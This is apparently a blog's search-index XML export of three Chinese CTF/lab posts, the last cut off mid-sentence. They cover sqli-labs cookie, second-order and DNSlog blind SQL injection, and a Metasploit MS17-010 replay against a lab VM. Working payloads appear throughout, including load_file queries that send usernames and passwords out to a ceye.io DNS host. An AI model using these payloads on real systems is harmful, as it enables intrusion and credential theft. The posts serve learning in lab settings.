<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>小迪-day17(编解码、二次注入、DNSlog盲注)</title>
    <link href="/2023/08/24/%E5%B0%8F%E8%BF%AA-day17(%E7%BC%96%E8%A7%A3%E7%A0%81%E3%80%81%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E3%80%81DNSlog%E7%9B%B2%E6%B3%A8)/"/>
    <url>/2023/08/24/%E5%B0%8F%E8%BF%AA-day17(%E7%BC%96%E8%A7%A3%E7%A0%81%E3%80%81%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E3%80%81DNSlog%E7%9B%B2%E6%B3%A8)/</url>
    
    <content type="html"><![CDATA[<h1 id="1、编解码注入"><a href="#1、编解码注入" class="headerlink" title="1、编解码注入"></a>1、编解码注入</h1><h2 id="靶场-sqlilabs-Less21"><a href="#靶场-sqlilabs-Less21" class="headerlink" title="靶场 sqlilabs-Less21"></a>靶场 sqlilabs-Less21</h2><img src="https://s2.loli.net/2022/11/25/Xz3PMJm9xUsl5w1.png" alt="image-20221114185737491" style="zoom: 25%;" /><p>登录后，使用bp抓包</p><img src="https://s2.loli.net/2022/11/25/Ihwj6la1V3KYWun.png" alt="image-20221114185838598" style="zoom: 50%;" /><p>分析源码：</p><p><img src="https://s2.loli.net/2022/11/25/wVyuUC4zsKBSleQ.png" alt="image-20221114190027008"></p><p>发现，如果正确登录，就会设置一个cookie，并且使用base64编码</p><p>分析cookie：</p><p><img src="https://s2.loli.net/2022/11/25/P2V4DhOaTtxlMIs.png" alt="image-20221114190506222"></p><p>发现此处可以进行cookie注入，但要注意，cookie经过base64编码</p><p>所以，抓到一个有cookie的包，</p><img src="https://s2.loli.net/2022/11/25/3aWnNlcDUd8P7iH.png" alt="image-20221114190153008" style="zoom: 50%;" /><p><strong>%3D</strong> 的urldecode值为 <strong>&#x3D;</strong> </p><p>将YWRtaW4&#x3D; 进行 base64解码得 ： admin</p><p><strong>cookie编码注入：</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile">admin&#x27;) and 1=1 <span class="hljs-comment">#</span><br>编码得：<br>YWRtaW4nKSBhbmQgMT0xICM=<br></code></pre></td></tr></table></figure><p>发送数据包：</p><img src="https://s2.loli.net/2022/11/25/IYMvpxmLwChkOPF.png" alt="image-20221114191352558" style="zoom:33%;" /><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile">&#x27;) or updatexml(0,concat(0x7e,database()),0) <span class="hljs-comment">#cookie报错注入</span><br>编码：<br>Jykgb3IgdXBkYXRleG1sKDAsY29uY2F0KDB4N2UsZGF0YWJhc2UoKSksMCkgIw==<br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/11/25/I4SA9cbEyCk65xh.png" alt="image-20221114191637057" style="zoom: 33%;" /><h1 id="2、二次注入"><a href="#2、二次注入" class="headerlink" title="2、二次注入"></a>2、二次注入</h1><p><img src="https://s2.loli.net/2022/11/25/nsykzIebFcwavuh.webp" alt="img"></p><h2 id="1、什么是二次注入"><a href="#1、什么是二次注入" class="headerlink" title="1、什么是二次注入"></a>1、什么是二次注入</h2><p>简单的说，二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。</p><p>网站对我们输入的一些重要的关键字进行了转义，但是这些我们构造的语句已经写进了数据库，可以在没有被转义的地方使用</p><p>可能每一次注入都不构成漏洞，但是如果一起用就可能造成注入。</p><p><strong>普通注入与二次注入的区别：</strong></p><ul><li><pre><code class="hljs">普通注入：- 在http后面构造语句，是立即直接生效的- 一次注入很容易被扫描工具扫描到 二次注入：- 先构造语句（有被转义字符的语句）- 我们构造的恶意语句存入数据库- 第二次构造语句（结合前面已经存入数据库的语句，成功。因为系统没有对已经存入数据库的数据做检查）- 二次注入更加难以被发现   <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><br><br><span class="hljs-section">## 2、二次注入原理</span><br><br>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。<br><br><br><br><span class="hljs-strong">**二次注入的原理，主要分为两步**</span>：<br><br><br><br><span class="hljs-strong">**第一步：插入恶意数据**</span><br><br>第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身包含恶意内容。<br><br><span class="hljs-strong">**第二部：引入恶意数据**</span><br><br>在将数据存入到了数据库中之后，开发者就认为数据是可信的。早下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。<br><br><br><br><span class="hljs-strong">**二次注入示例：**</span><br><br><span class="hljs-strong">**<span class="hljs-emphasis">*寻找插入数据库，并会转义的操作\*</span>**</span><br><br>输入参数1&#x27; --&gt;参数经过转义函数1\‘ --&gt;参数进入数据库还原为1’<br><br><span class="hljs-strong">**<span class="hljs-emphasis">*寻找另一处引用这个数据的操作\*</span>**</span><br><br>将1‘从数据库中取出--&gt;取出后直接给变量并带入SQL--&gt;SQL注入触发<br><br><br><br></code></pre></td></tr></table></figure></code></pre></li></ul><p>应用场景—</p><p>在前端和URL（黑盒测试）是无法发现二次注入，无法用工具扫描，只有在代码审计时才能发现是否存在二次注入 </p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><br><br><br><span class="hljs-comment">## sqlilabs-Less24</span><br><br><br><br><span class="hljs-number">1</span>、尝试在注册页面插入恶意数据，我们先注册一个账号，用户名为：admin&#x27;<span class="hljs-comment">#，密码为123456。</span><br><br>&lt;img src=<span class="hljs-string">&quot;https://s2.loli.net/2022/11/25/92lxNt3j5GLzWd7.png&quot;</span> alt=<span class="hljs-string">&quot;image-20221114192429865&quot;</span> style=<span class="hljs-string">&quot;zoom:33%;&quot;</span> /&gt;<br><br><br><br><span class="hljs-number">2</span>、查看恶意数据是否成功写入数据库<br><br>这是因为当数据写入到数据库的时候反斜杠会被移除，所以写入到数据库的内容就是原始数据，并不会在前面多了反斜杠。<br><br>&lt;img src=<span class="hljs-string">&quot;https://s2.loli.net/2022/11/25/57ZKdLxorA2qzHk.png&quot;</span> alt=<span class="hljs-string">&quot;image-20221114192600792&quot;</span> style=<span class="hljs-string">&quot;zoom:33%;&quot;</span> /&gt;<br><br><br><br></code></pre></td></tr></table></figure><p>而这时的admin原密码是admin，并且两个账号都存储在数据库内的。当我们重新修改admin’#的密码时，这里修改为12345678；可以发现admin的密码却被修改为了xxxxxxx；而admin’#用户的密码并没有发生变化。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br>&lt;img src=<span class="hljs-string">&quot;https://s2.loli.net/2022/11/25/WbpZgsfIc1o3d9L.png&quot;</span> alt=<span class="hljs-string">&quot;image-20221114192807802&quot;</span> style=<span class="hljs-string">&quot;zoom:33%;&quot;</span> /&gt;<br><br>&lt;img src=<span class="hljs-string">&quot;https://s2.loli.net/2022/11/25/CKkEy4wtBlVbR5a.png&quot;</span> alt=<span class="hljs-string">&quot;image-20221114192852917&quot;</span> style=<span class="hljs-string">&quot;zoom:33%;&quot;</span> /&gt;<br><br>源码分析：<br><br>![image-<span class="hljs-number">20221114193053603</span>](https:<span class="hljs-regexp">//</span>s2.loli.net<span class="hljs-regexp">/2022/</span><span class="hljs-number">11</span><span class="hljs-regexp">/25/</span>wA9fuyZenavQmGO.png)<br><br><br><br></code></pre></td></tr></table></figure><p>update users set password&#x3D;’xxxxxxx’ where username&#x3D;’admin’ #’ and password&#x3D;’123456’<br>用户名为： admin’ #  相当于把语句的后半部分给注释掉了，把用户名为admin的密码给改了<br>相当于：<br>update users set password&#x3D;’xxxxxxx’ where username&#x3D;’admin’</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br><br><br>这就是二次注入<br><br><br><br># 3、DNSlog盲注<br><br><br><br><span class="hljs-strong">**1.DNS**</span><br><br>DNS(Domain Name System，域名系统)，因特网上作为域名和[IP地址](<span class="hljs-link">https://baike.so.com/doc/4252723-4455111.html)相互映射的一个</span>[<span class="hljs-string">分布式数据库</span>](<span class="hljs-link">https://baike.so.com/doc/6591740-6805519.html)，能够使用户更方便的访问</span>[<span class="hljs-string">互联网</span>](<span class="hljs-link">https://baike.so.com/doc/2011565-2128705.html)，而不用去记住能够被机器直接读取的IP数串。通过</span>[<span class="hljs-string">主机</span>](<span class="hljs-link">https://baike.so.com/doc/5331327-5566564.html)名，最终得到该主机名对应的IP地址的过程叫做域名解析(或主机名解析)。DNS协议运行在</span>[<span class="hljs-string">UDP</span>](https://baike.so.com/doc/5418284-5656447.html)协议之上，使用端口号53。在RFC文档中RFC 2181对DNS有规范说明，RFC 2136对DNS的动态更新进行说明，RFC 2308对DNS查询的反向缓存进行说明。<br><br><br><br><span class="hljs-strong">**2.Dnslog**</span><br><br>Dnslog就是存储在DNS Server上的域名信息，它记录着用户对域名<span class="hljs-code">`www.test.com`</span>、<span class="hljs-code">`t00ls.com.`</span>等的访问信息。<br><br><br><br><span class="hljs-strong">**DnsLog盲注**</span><br><br>对于SQL盲注，我们可以通过布尔或者时间盲注获取内容，但是整个过程效率低，需要发送很多的请求进行判断，容易触发安全设备的防护，Dnslog盲注可以减少发送的请求，直接回显数据实现注入 使用DnsLog盲注仅限于windos环境。<br><br><br><br><span class="hljs-strong">**原理图:**</span><br><br>![img](https://s2.loli.net/2022/11/25/M4nyYGNruzUdK9q.png)<br><br><span class="hljs-code"> </span><br><br>如图，攻击者首先提交注入语句select load_file(concat(<span class="hljs-emphasis">&#x27;\\\\&#x27;</span>,<span class="hljs-emphasis">&#x27;攻击语句&#x27;</span>,.XXX.ceye.io\\abc))<br><br>在数据库中攻击语句被执行，由<span class="hljs-strong">**`concat`**</span>函数将执行结果与<span class="hljs-strong">**`XXX.ceye.io\\abc`**</span>拼接，构成一个新的域名，而mysql中的<span class="hljs-strong">**`select load_file()`**</span>可以发起请求，那么这一条带有数据库查询结果的域名就被提交到DNS服务器进行解析<br><br>此时，如果我们可以查看DNS服务器上的Dnslog就可以得到SQL注入结果。那么我们如何获得这条DNS查询记录呢？注意注入语句中的<span class="hljs-strong">**`ceye.io`**</span>，这其实是一个开放的Dnslog平台（具体用法在官网可见），在[<span class="hljs-link">http://ceye.io](http://ceye.io/)上我们可以获取到有关`ceye.io`的DNS查询信息。实际上在域名解析的过程中，是由顶级域名向下逐级解析的，我们构造的攻击语句也是如此，当它发现域名中存在`ceye.io`时，它会将这条域名信息转到相应的NS服务器上，而通过</span>[<span class="hljs-string">http://ceye.io</span>](http://ceye.io/)我们就可以查询到这条DNS解析记录。<br><br><span class="hljs-code"> </span><br><br><span class="hljs-strong">**构造语法**</span><br><br>构造语句，利用load_file()函数发起请求，使用Dnslog接受请求，获取数据<br><br></code></pre></td></tr></table></figure><p>SELECT LOAD_FILE(CONCAT(‘\&#39;,(select database(),’mysql.cmr1ua.ceye.io\abc’)))</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br>通过SQL语句查询内容，作为请求的一部分发送至Dnslog<br><br>只要对这一部分语句进行构造，就能实现有回显的SQL注入<br><br><span class="hljs-strong">**payload:**</span><br><br><span class="hljs-strong">**获取数据库名**</span><br><br></code></pre></td></tr></table></figure><p><a href="http://127.0.0.1/lou/sql/Less-9/?id=1">http://127.0.0.1/lou/sql/Less-9/?id=1</a>‘ and load_file(concat(‘\\‘,(select database()),’.cmr1ua.ceye.io\abc’))–+</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br> 通过dnslog查看到数据名为security<br><br>![img](https:<span class="hljs-regexp">//</span>s2.loli.net<span class="hljs-regexp">/2022/</span><span class="hljs-number">11</span><span class="hljs-regexp">/25/</span>joIOd8LWDfbXeFN.png)<br><br> **获取数据表**<br><br></code></pre></td></tr></table></figure><p><a href="http://127.0.0.1/lou/sql/Less-9/?id=1">http://127.0.0.1/lou/sql/Less-9/?id=1</a>‘ and load_file(concat(‘\\‘,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),’.cmr1ua.ceye.io\abc’))–+</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br><span class="hljs-strong">**获取表中的字段名**</span><br><br></code></pre></td></tr></table></figure><p>‘ and load_file(concat(‘\\‘,(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),’.cmr1ua.ceye.io\abc’))–+</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br><span class="hljs-strong">**获取表中字段下的数据**</span><br><br></code></pre></td></tr></table></figure><p>‘ and load_file(concat(‘\\‘,(select password from users limit 0,1),’.cmr1ua.ceye.io\abc’))–+<br>‘ and load_file(concat(‘\\‘,(select username from users limit 0,1),’.cmr1ua.ceye.io\abc’))–+</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><br>因为在load_file里面不能使用@ ~等符号所以要区分数据我们可以先用group_ws<span class="hljs-comment">()</span>函数分割在用hex<span class="hljs-comment">()</span>函数转成十六进制即可 出来了再转回去<br><br></code></pre></td></tr></table></figure><p>‘ and load_file(concat(‘\\‘,(select hex(concat_ws(‘~’,username,password)) from users limit 0,1),’.cmr1ua.ceye.io\abc’))–+</p><pre><code class="hljs">参考资料：https://www.cnblogs.com/xhds/p/12322839.html# 4、中转注入编写php脚本，</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小迪-day17(编解码、二次注入、DNSlog盲注)</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>永恒之蓝漏洞复现</title>
    <link href="/2023/08/24/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/08/24/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="【ms17-010】永恒之蓝漏洞复现"><a href="#【ms17-010】永恒之蓝漏洞复现" class="headerlink" title="【ms17-010】永恒之蓝漏洞复现"></a>【ms17-010】永恒之蓝漏洞复现</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><ul><li>攻击机：kali，ip：192.168.56.128</li><li>靶机：windows server 2003，ip：192.168.56.132</li><li>工具：nmap(扫描)、msf</li></ul><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>首先我们先在攻击机上使用nmap扫一下该网段主机的存活情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sS 192.168.56.0/24<br>/24是子网掩码1的的位数，代表有24个一，其余8位为0，即：255.255.255.0<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304032105716.png" alt="image-20230403210537347" style="zoom:33%;" /><p>此时已经扫描出来了，ip为：<code>192.168.56.132</code>的主机开启，并且显示了开放的端口号。</p><p>然后我们可以使用：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -p <span class="hljs-number">1</span>-<span class="hljs-number">1000</span> <span class="hljs-number">192.168.56.132</span><br></code></pre></td></tr></table></figure><p>去扫描该主机端口从1-1000的开放情况</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304032108477.png" alt="image-20230403210805406" style="zoom:50%;" /><p>可以看到开放了如下端口：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata">PORT    STATE SERVICE<br>135/tcp <span class="hljs-keyword">open</span>  msrpc<br>139/tcp <span class="hljs-keyword">open</span>  netbios-ssn<br>445/tcp <span class="hljs-keyword">open</span>  microsoft-<span class="hljs-keyword">ds</span><br></code></pre></td></tr></table></figure><p>接着我们使用命令去扫描该主机的操作系统类型：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -O <span class="hljs-number">192.168.56.132</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304032109610.png" alt="image-20230403210947500"></p><p>查询出来操作系统为：<code>win2003</code></p><p>分析了相关信息后，我们就可以使用<code>nmap</code>自带的脚本去扫描该主机上的漏洞了：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> --script=vuln <span class="hljs-number">192.168.56.132</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304032113653.png" alt="image-20230403211305483"></p><p>这里扫描出来了两个漏洞，<code>ms17-010</code>就是<strong>永恒之蓝漏洞</strong></p><p>我们已经使用<code>nmap</code>扫描出来了漏洞，接着我们需要使用工具利用漏洞</p><p>这里我们选择 <code>Metasploit Framework</code>(<code>MSF</code>)</p><blockquote><p><code>Metasploit</code>（MSF）是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。</p><p>它本身附带数百个已知软件漏洞，<strong>是一款专业级漏洞攻击工具</strong></p><p>因为只要掌握MSF的使用方法，每个人都可以使用MSF来攻击那些未打过补丁或者刚刚打过补丁的漏洞。</p></blockquote><p>在<code>kali</code>上，我们使用 <code>msfconsole</code>，进入这个工具：</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304032117565.png" alt="image-20230403211728408" style="zoom:33%;" /><p>由于我们在上面已经知道了永恒之蓝编号：(<code>ms17-010</code>)</p><p>所以我们在<code>msf</code>中可以使用<code>search</code>命令去搜索相关漏洞：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">search</span> ms17-<span class="hljs-number">010</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304032119487.png" alt="image-20230403211939359"></p><p>然后我们使用<code>use</code>命令，去选择相关模块：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-keyword">use</span> <span class="hljs-number">1</span>   <span class="hljs-comment"># 我们选择一号模块，可以远程执行代码</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304032122351.png" alt="image-20230403212241273"></p><p>然后我们使用命令：<code>show options</code>，显示配置项</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304032125285.png" alt="image-20230403212524030"></p><p>此处我们设置一下<code>RHOSTS</code>(靶机的ip地址)，使用<code>set</code>命令</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> RHOSTS <span class="hljs-comment">192.168.56.132</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304032126089.png" alt="image-20230403212657048"></p><p>设置完成之后，就可以开始攻击了，使用<code>run</code>或者<code>exploit</code></p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304032128114.png" alt="image-20230403212854960"></p><blockquote><p><strong>运行成功会出现meterpreter &gt;<br>Meterpreter 是 Metasploit 的一个扩展模块，可以调用 Metasploit 的一些功能，<br>对目标系统进行更深入的渗透，如获取屏幕、上传&#x2F;下载文件、创建持久后门等。</strong></p></blockquote><p>这个时候我们已经成功了，远程命令执行。</p><p>我们使用<code>screenshot</code>命令，获取靶机的屏幕截图</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304032131678.png" alt="image-20230403213126511"></p><p>还可以使用远程桌面命令：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> vnc<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304032133102.png" alt="image-20230403213317977"></p><p><code>help</code>命令可以查看可以使用哪些命令</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304032134231.png" alt="image-20230403213453081" style="zoom: 50%;" /><p>反弹shell</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304032138916.png" alt="image-20230403213829861" style="zoom: 50%;" />]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>永恒之蓝漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>小迪-day14(注入类型之提交注入)</title>
    <link href="/2023/08/24/%E5%B0%8F%E8%BF%AA-day14(%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E4%B9%8B%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5)/"/>
    <url>/2023/08/24/%E5%B0%8F%E8%BF%AA-day14(%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E4%B9%8B%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5)/</url>
    
    <content type="html"><![CDATA[<h1 id="1、参数提交注入"><a href="#1、参数提交注入" class="headerlink" title="1、参数提交注入"></a>1、参数提交注入</h1><img src="https://s2.loli.net/2022/11/25/TJljdeBycEXGHws.png" alt="img" style="zoom: 50%;" /><h2 id="1-1-明确参数类型"><a href="#1-1-明确参数类型" class="headerlink" title="1.1 明确参数类型"></a>1.1 明确参数类型</h2><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">数字，字符，搜索，<span class="hljs-built_in">JSON</span>等<br></code></pre></td></tr></table></figure><h2 id="1-2-明确提交方式"><a href="#1-2-明确提交方式" class="headerlink" title="1.2 明确提交方式"></a>1.2 明确提交方式</h2><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbscript"><span class="hljs-keyword">GET</span>, POST,COOKIE,<span class="hljs-built_in">REQUEST</span>，HTTP头等<br></code></pre></td></tr></table></figure><p>可能有些网站是以Request的方式接受参数，所以GET和POST都行 </p><p>注入的地方可能在User-Agent、cookie上，关键是看是否带入数据库查询。</p><h2 id="1-3-如何去闭合sql"><a href="#1-3-如何去闭合sql" class="headerlink" title="1.3 如何去闭合sql"></a>1.3 如何去闭合sql</h2><p>sql语句干扰符号: ‘   ,”     ,    )  ,  }    % 等，具体需看写法</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-string">&#x27;  &quot;  将sql字符串包裹，可以相应使用&#x27;</span> <span class="hljs-comment">&quot;  去闭合原sql语句，使插入的sql语句生效</span><br>% 出现在like  模糊查询<br>(  )可能出现在<span class="hljs-keyword">insert</span>等语句中<br></code></pre></td></tr></table></figure><h2 id="1-4-注入中注释的使用"><a href="#1-4-注入中注释的使用" class="headerlink" title="1.4 注入中注释的使用"></a>1.4 注入中注释的使用</h2><p><strong>–+</strong> 在get请求方式放在url中可以使用，相当于sql中的注释，–+相当于 – （–空格），可以使后面的sql语句被注释</p><p><strong>#</strong> 也可当作注释使用，post中不用 （–+），用#注释后面的sql语句</p><h1 id="2、参数字符型注入测试"><a href="#2、参数字符型注入测试" class="headerlink" title="2、参数字符型注入测试"></a>2、参数字符型注入测试</h1><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sqlilabs <span class="hljs-comment">-- less5、6</span><br></code></pre></td></tr></table></figure><h2 id="2-1-less5"><a href="#2-1-less5" class="headerlink" title="2.1 less5"></a>2.1 less5</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">$<span class="hljs-keyword">sql</span><span class="hljs-operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;<br></code></pre></td></tr></table></figure><p>SQL执行的语句是采用了  ‘  单引号闭合,</p><p>我们要是直接使用?id&#x3D;1 and 1&#x3D;1相当于执行的是<code>SELECT * FROM users WHERE id=&#39;1 and 1=1&#39; LIMIT 0,1;</code>是不会有任何的反应。</p><p>正确写法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; and &#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<br>?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; and &#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>2<br></code></pre></td></tr></table></figure><p>或者：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1 --+<br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=2 --+<br>--+ 将后面的sql语句进行注释<br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/11/25/cABjIFzxgrvDRXo.png" alt="image-20221111090609506" style="zoom:25%;" /><img src="https://s2.loli.net/2022/11/25/LnlATbSg5rIQfEy.png" alt="image-20221111090627247" style="zoom:25%;" /><p>使用 order by 3 